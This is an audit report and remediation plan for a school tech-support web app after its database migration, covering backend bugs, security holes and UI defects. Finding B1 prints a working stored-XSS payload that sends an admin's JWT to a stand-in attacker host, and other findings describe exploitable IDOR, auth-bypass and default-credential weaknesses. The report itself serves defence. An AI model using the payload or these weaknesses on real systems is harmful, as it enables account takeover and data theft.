# System Audit & Implementation Plan — August 2026

**System:** QFT Technical Support System (Opportunity Education Tanzania)
**Date:** 2026-08-03
**Context:** Audit run immediately after the PostgreSQL → MySQL migration (commit `d1b2aed`) and the new Tablet Inventory module. Three parallel reviews covered (A) backend/database correctness, (B) security, and (C) frontend/UI. Every finding below was confirmed against the actual code.

---

## How to read this

Each finding has a **severity**:

| Severity | Meaning |
|----------|---------|
| **P0** | Broken right now — a feature crashes, a page is unreachable, or a critical exploit is live. Fix first. |
| **P1** | Serious bug, data-loss risk, or a real security hole that needs a known target/condition. |
| **P2** | Hardening / quality — should fix, not an emergency. |
| **P3** | Minor polish, cleanup, or nice-to-have. |

The **Implementation Plan** at the end groups these into phases you can ship one deploy at a time.

---

## A. Backend & Database (post-MySQL-migration)

The migration is **almost** clean — nearly all SQL is proper MySQL (`ON DUPLICATE KEY UPDATE`, `CURDATE()`, `NOW()`, `DATE_SUB(... INTERVAL ? HOUR)`, `result.insertId`). No `::` casts, `ILIKE`, `RETURNING`, `pg` imports, or `$1` placeholders remain. But a few real breakers survived:

### P0 — crashes a feature
- **A1. PostgreSQL array syntax `id = ANY(?)`** — [teamController.js:108](backend/src/controllers/teamController.js:108). MySQL has no `= ANY(value-list)`; this throws a SQL parse error. **Breaks:** assigning schools to a sub-admin (`PATCH /api/team/:id/schools`). **Fix:** `WHERE id IN (?)` (mysql2 expands the array).
- **A2. Query against a table that doesn't exist** — [dashboardController.js:109](backend/src/controllers/dashboardController.js:109) does `SELECT COUNT(*) FROM guides`; the real table is `troubleshooting_guides`. **Breaks:** the entire **teacher** dashboard (500 error). **Fix:** use `troubleshooting_guides`.

### P1 — serious
- **A3. AI-chat handlers have no error handling** — [aiChatController.js](backend/src/controllers/aiChatController.js) (`getChats`, `getChat`, `deleteChat`, `sendMessage`) use `(req, res)` with no `try/catch`/`next`. In Express 4 a rejected async handler is **not** caught by the error middleware — the request hangs and can crash the whole Node process. **Fix:** wrap each in `try/catch (err) { next(err); }`.
- **A4. Multi-step writes have no transactions** — nothing in the codebase uses `beginTransaction`. Highest risk: `approveRegistration`, `registerTeacher`, `createTeacher` in [registrationController.js](backend/src/controllers/registrationController.js) — a partial failure leaves an orphaned user account or a mis-counted invite link. **Fix:** wrap each sequence in a connection transaction (`getConnection` → `beginTransaction` → `commit`/`rollback` → `release`).

### P2 — quality
- **A5. Dashboard check-in count is always ~0** — [dashboardController.js:60-64](backend/src/controllers/dashboardController.js:60) filters check-ins by `term = "2026"` and an ISO week number, but check-ins are stored with `term = "Term 2 · 2026"` and small week numbers. The dashboard "done" ring never matches. **Fix:** use the same term/week convention as the write path.
- **A6. More multi-step writes without transactions (lower impact)** — `schoolController.remove` / `saveForms`, `teamController.remove`, `errorController.remove`, inventory create/update/assign/status (row + history). Wrap in transactions.
- **A7. Migration errors are fully swallowed** — [schemaExtensions.js:11-18](backend/src/config/schemaExtensions.js:11) logs and ignores *every* failure (needed because MySQL 8 lacks `ADD COLUMN IF NOT EXISTS`). Side effect: harmless "Duplicate column" noise on every startup, and a *real* schema bug would be hidden. **Fix:** check `information_schema` before `ADD COLUMN`/`CREATE INDEX`, or only swallow the known "already exists" error codes.

### P3 — cleanup
- **A8.** `changePassword` reads `rows[0]` without a length check ([authController.js:222](backend/src/controllers/authController.js:222)).
- **A9.** Render-era comments and forced-HTTPS block in [server.js:33-41](backend/src/server.js:33) — review for DirectAdmin.
- **A10.** Upload-size error message says "5MB" but limit is 100MB ([errorHandler.js:9](backend/src/middleware/errorHandler.js:9)).
- **A11.** `sla_breach_notified` column is created but never used.

---

## B. Security

**Good news first:** SQL is fully parameterized (no injection found anywhere), `JWT_SECRET` has no in-code fallback (auth fails closed if it's unset), uploads go to Cloudinary (no local path traversal), and login/registration have rate limiters.

### P0 — critical exploit
- **B1. Stored XSS in the notifications bell → admin account takeover** — [notifications.js:168-178](frontend/js/components/notifications.js:168) writes `item.title`/`item.sub` into `innerHTML` **unescaped**. Several sources are *unauthenticated public input*: school-admin registration `full_name`, appeal messages, teacher-join requests. An attacker registers with a `full_name` like `<img src=x onerror="fetch('//evil/?t='+localStorage.token)">`; when the **platform admin** opens the bell to review approvals, the script runs in their session and steals their JWT. Helmet's CSP is disabled, so nothing blocks it. **Fix:** `esc()` every dynamic value in `renderPanel`, and enable a Content-Security-Policy (see B9).

### P1 — serious
- **B2. Inventory endpoints — missing role checks + no tenant scoping** — [routes/inventory.js:20-22](backend/src/routes/inventory.js:20). `PUT /:id`, `PATCH /:id/assign`, `PATCH /:id/status` have **no `authorize()`**, and the controller doesn't check that the device belongs to the caller's school. A `school`/`teacher` user can edit or relabel **any device in any other school**; reads/export return **all** schools' devices for a teacher. **Fix:** add `authorize('admin','subadmin','school')` on writes and scope every query/action by `school_id` (deny teachers on writes).
- **B3. Stored XSS in inventory cards & history** — [inventory.js](frontend/js/pages/inventory.js) renders `asset_tag`, `serial_number`, `model`, `student_name`, form/stream, and history `old_value`/`new_value`/`note` into `innerHTML` unescaped. **Fix:** wrap all in `esc()`.
- **B4. IDOR — any school can read any other school's check-ins** — [checkinController.js:38-46](backend/src/controllers/checkinController.js:38) `getBySchool` uses `req.params.schoolId` with no scope check. **Fix:** enforce `school_id`/`assigned_admin_id` ownership.
- **B5. Sub-admin scope not enforced on errors** — [errorController.js](backend/src/controllers/errorController.js) `getById`, `updateStatus`, `addUpdate`, `update` never check a sub-admin's `assigned_admin_id`, so one sub-admin can read/modify errors belonging to another sub-admin's schools. **Fix:** verify the error's school is assigned to the sub-admin.
- **B6. Auth bypass via registration-status endpoint** — [registrationController.js:65-99](backend/src/controllers/registrationController.js:65) (`getRegistrationStatus`, public) **mints a full JWT** given just `id` + `email` once a request is approved. An attacker who knows a staff email can poll sequential IDs until approval and get a valid session — no password needed. **Fix:** never issue a login token from an unauthenticated endpoint; require password login.
- **B7. Default admin credentials** — [bootstrap.js:87](backend/src/config/bootstrap.js:87) seeds `admin` / `admin123`. **Fix:** force a password change on first login, or seed from an env var.

### P2 — hardening
- **B8.** Settings table readable unauthenticated ([routes/settings.js:5](backend/src/routes/settings.js:5)) — whitelist branding keys only.
- **B9.** Helmet CSP disabled ([server.js:45](backend/src/server.js:45)) — enable `script-src 'self'` (this alone neutralizes B1/B3).
- **B10.** CORS reflects any origin with credentials when `FRONTEND_URL` is unset ([server.js:49-52](backend/src/server.js:49)) — require an allow-list.
- **B11.** 500 handler leaks raw `err.message` to clients ([errorHandler.js:12-15](backend/src/middleware/errorHandler.js:12)) — return a generic message, log details server-side.
- **B12.** `communicationController` create/remove not scoped for sub-admins.
- **B13.** `schoolController.getById`/`getForms` not scoped for sub-admin/school.
- **B14.** `esc()` doesn't escape `'` or backtick ([utils.js:5](frontend/js/utils.js:5)) — add them.
- **B15.** Inconsistent password policy (min 6 vs 8) and bcrypt cost (10 vs 12) — standardize on ≥8 / cost 12.

### P3 — minor
- **B16.** Public registration endpoints allow enumeration (school list, teacher status by email).
- **B17.** 7-day JWT, no server-side revocation; a stolen token lives up to 7 days.
- **B18.** Appeal flow can repeatedly reset a rejected request back to `pending` (queue spam).

---

## C. Frontend & UI

### P0 — feature broken
- **C1. Tablet Inventory page is unreachable** — [router.js:6](frontend/js/router.js:6) `validPages` omits `'inventory'`, so clicking the nav item renders inventory then the `hashchange` handler bounces back to Dashboard; a refresh on `#inventory` loads Dashboard. **Fix:** add `'inventory'` to `validPages`.
- **C2. Inventory calls `Toast.show(...)` which doesn't exist** — [inventory.js](frontend/js/pages/inventory.js) uses `Toast.show()` at 13 sites, but the app's global is `showToast()`. Every add/edit/status/delete/import throws `ReferenceError`, and because the throw happens before `reload()`, the list never refreshes after a successful change. **Fix:** replace all with `showToast()` and reorder so `reload()` runs first.

### P1 — serious UX
- **C3. Inventory filter bar overflows on mobile** — [inventory.js:54-76](frontend/js/pages/inventory.js:54) is a no-wrap flex row with ~640px of fixed-min children. **Fix:** `flex-wrap:wrap` + a mobile breakpoint.
- **C4. Inventory forms allow double-submit** — none of the submit handlers disable the button during `await`, so a double-click creates duplicate devices / double-imports. **Fix:** disable + spinner during submit (the rest of the app already does this).

### P2 — polish / layout
- **C5.** Inventory sticky filter bar `top:52px`/`z-index:100` collides with the sticky section header on mobile (header grows taller when it stacks).
- **C6.** `initScrollReveal` adds a scroll listener on every render without removing the old one ([app.js:116](frontend/js/app.js:116)) — listeners pile up.
- **C7.** Many in-page tab/section clicks call `App.render()` (approvals, teachers, guides, help, weekly, schools), violating the CLAUDE.md in-place-swap rule (flicker, scroll reset, listener leak).
- **C8.** `inventory.js?v=1` is out of step with the global `?v=7` cache convention — bump it in lockstep.
- **C9.** Inventory card grid `minmax(340px,1fr)` overflows on ~360px phones — use `minmax(min(340px,100%),1fr)`.
- **C10.** Inventory modals use native `<select>` instead of the app's custom `Dropdown`.

### P3 — minor
- **C11.** Inventory `reload()` doesn't re-bind the header elevation listener.
- **C12.** Native `confirm()` used for destructive actions (inventory delete, teachers).
- **C13.** Dead exported functions in inventory (`filterStatus`/`filterForm`/`filterSchool`).
- **C14.** CSV import maps `student_name` to any header containing "name" (would grab `school_name`).
- **C15.** `teachers.js` `deactivateLink`/`updateStatus` don't check `res.ok` — show success even on failure, and bypass the 401 handler.
- **C16.** Mojibake (`â€"`) in some `index.html` copy — verify file encoding.

---

## Implementation Plan

Phased so each phase is one safe, verifiable deploy. **Database rule (from CLAUDE.md): all schema work is additive/idempotent — no phase drops or renames columns.** None of these fixes require a destructive migration.

### Phase 1 — Stop the bleeding (P0) · *ship first, together*
The system has broken features and one live exploit. Small, self-contained fixes:
1. **A1** `id = ANY(?)` → `IN (?)` (sub-admin school assignment).
2. **A2** `FROM guides` → `troubleshooting_guides` (teacher dashboard).
3. **C1** add `'inventory'` to `validPages` (page reachable).
4. **C2** `Toast.show` → `showToast` + reorder `reload()` (inventory actions work).
5. **B1** `esc()` all values in `notifications.js renderPanel` (kills the account-takeover XSS).

### Phase 2 — Security hardening (P1 security)
6. **B2** inventory route `authorize()` + `school_id` scoping.
7. **B3** `esc()` inventory cards/history.
8. **B4** check-in `getBySchool` ownership scope.
9. **B5** sub-admin scope on error read/write.
10. **B6** stop minting JWTs from the public status endpoint.
11. **B7** force admin password change on first login (or env-seeded password).
12. **B9** enable a restrictive Helmet CSP (defense-in-depth behind B1/B3).
13. **B14** extend `esc()` to `'` and backtick.

### Phase 3 — Backend robustness (P1 backend)
14. **A3** error handling on AI-chat handlers.
15. **A4** transactions around registration/teacher-creation writes.

### Phase 4 — Quality & UX (P2)
16. **A5** fix dashboard check-in term/week mismatch.
17. **A6** transactions on remaining multi-step writes.
18. **A7** make migrations check `information_schema` (quieter, safer startup).
19. **B8, B10, B11, B12, B13, B15** remaining security hardening.
20. **C3, C4, C5, C6, C7, C8, C9, C10** UI/UX fixes (inventory mobile, double-submit, listener leak, in-place nav, cache version).

### Phase 5 — Polish (P3)
21. Everything in the P3 lists (A8-A11, B16-B18, C11-C16) — cleanup, minor consistency, encoding.

---

## Data-Transfer Objects (DTOs)

To make validation and tenant-scoping consistent (and to close several P1s at their source), define request/response DTOs per resource. See [DTO_SPEC.md](docs/DTO_SPEC.md) for the full field-level contract. Summary of what each DTO enforces:

- **Inventory (Device)** — allowed create/update fields, valid `status` enum, and that `school_id` is *derived from the authenticated user* for `school` role (never trusted from the body) — directly fixes B2.
- **Check-in** — `school_id` scoped to the caller; validated `status`/sub-status enums — supports B4.
- **Error** — create/update/assign shapes with sub-admin ownership implied — supports B5.
- **Registration / Teacher** — separates public-submit fields from admin-only fields; status endpoint returns *status only*, never a token — supports B6.
- **Auth** — password rules (≥8) centralized — supports B15.

---

*Generated from three parallel code audits, each finding verified against the source before inclusion.*
